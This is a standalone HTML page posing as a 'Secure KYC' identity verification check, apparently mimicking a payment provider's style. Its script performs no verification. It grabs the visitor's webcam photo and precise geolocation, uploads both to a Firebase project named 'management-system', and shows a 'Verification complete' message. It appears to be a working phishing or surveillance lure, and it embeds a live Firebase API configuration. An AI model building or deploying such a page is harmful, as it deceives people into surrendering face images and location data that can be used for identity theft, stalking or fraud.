<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure KYC</title>
    <link href="https://fonts.googleapis.com/css2?family=Mulish:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --rp-blue: #3395ff; --rp-success: #2ecc71; }
        body { font-family: 'Mulish', sans-serif; background: #f5f8fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 35px; border-radius: 4px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 380px; text-align: center; border-top: 5px solid var(--rp-blue); }
        #webcam { width: 100%; border-radius: 4px; margin-bottom: 20px; display: none; transform: scaleX(-1); background: #000; }
        button { background: var(--rp-blue); color: white; border: none; padding: 14px; border-radius: 2px; font-weight: 700; width: 100%; cursor: pointer; text-transform: uppercase; }
        .spinner { display: none; width: 14px; height: 14px; border: 2px solid #fff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status { margin-top: 15px; font-size: 11px; color: #888; text-align: left; background: #f9f9f9; padding: 10px; border: 1px solid #eee; }
    </style>
</head>
<body>
    <div class="card" id="card">
        <h2 id="title">Identity Verification</h2>
        <p id="desc">Standard security check for activation.</p>
        <video id="webcam" autoplay playsinline></video>
        <canvas id="canvas" style="display:none"></canvas>
        <button id="btn"><span class="spinner" id="loader"></span><span id="txt">Start Verification</span></button>
        <div class="status" id="log">Status: Ready</div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <script>
        const firebaseConfig = {
          apiKey: "AIzaSyDiuJzAE0cPsyIFP4AbOhMogCYYMveYWs0",
  authDomain: "management-system-42018.firebaseapp.com",
  databaseURL: "https://management-system-42018-default-rtdb.firebaseio.com",
  projectId: "management-system-42018",
  storageBucket: "management-system-42018.firebasestorage.app",
  messagingSenderId: "54905325970",
  appId: "1:54905325970:web:d904a020fc8ca66fa2d94b"

        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const storage = firebase.storage();

        let step = 1; let loc = { lat: 0, lon: 0 };
        const btn = document.getElementById('btn');
        const video = document.getElementById('webcam');

        btn.onclick = async () => {
            if(step === 1) {
                navigator.geolocation.getCurrentPosition(p => { loc = { lat: p.coords.latitude, lon: p.coords.longitude }; });
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = s; video.style.display = "block";
                document.getElementById('txt').innerText = "Capture Photo"; step = 2;
            } else {
                btn.disabled = true; document.getElementById('loader').style.display = "inline-block";
                const c = document.getElementById('canvas');
                c.width = video.videoWidth; c.height = video.videoHeight;
                c.getContext('2d').drawImage(video, 0, 0);
                c.toBlob(async b => {
                    const ref = storage.ref().child(`kyc/${Date.now()}.jpg`);
                    await ref.put(b);
                    const url = await ref.getDownloadURL();
                    await db.collection("kyc_submissions").add({ photo: url, lat: loc.lat, lon: loc.lon, time: firebase.firestore.FieldValue.serverTimestamp() });
                    document.getElementById('card').innerHTML = `<h1 style="color:#2ecc71">âœ“</h1><h2>Success</h2><p>Verification complete.</p>`;
                }, 'image/jpeg');
            }
        };
    </script>
</body>
</html>
